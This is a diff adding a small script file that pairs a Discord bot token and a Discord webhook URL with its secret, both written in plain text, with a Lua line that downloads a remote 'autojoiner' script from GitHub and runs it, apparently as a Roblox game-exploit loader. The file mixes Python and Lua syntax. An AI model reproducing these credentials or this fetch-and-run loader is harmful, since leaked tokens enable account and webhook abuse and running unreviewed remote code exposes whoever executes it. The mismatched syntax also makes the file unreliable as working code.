@@ -1,0 +1,7 @@
+Discord_Token = "MTA5NjAxMDM5NDM2NTA3MTM4MA.GHWFCg.FDZcIU53FPRKpLTNPzzvJ6tZOSoX05D8k9JphU"
+
+Webhooks = {
+    'https://discord.com/api/webhooks/1395998217664991354/Za9tJktPt5f1RNfk-w02T3eF91SVC6o7G2KFXqSFWhcfFSKIR_-kjMupivMZ5HwWWoIu'
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/games/autojoiner.lua"))()
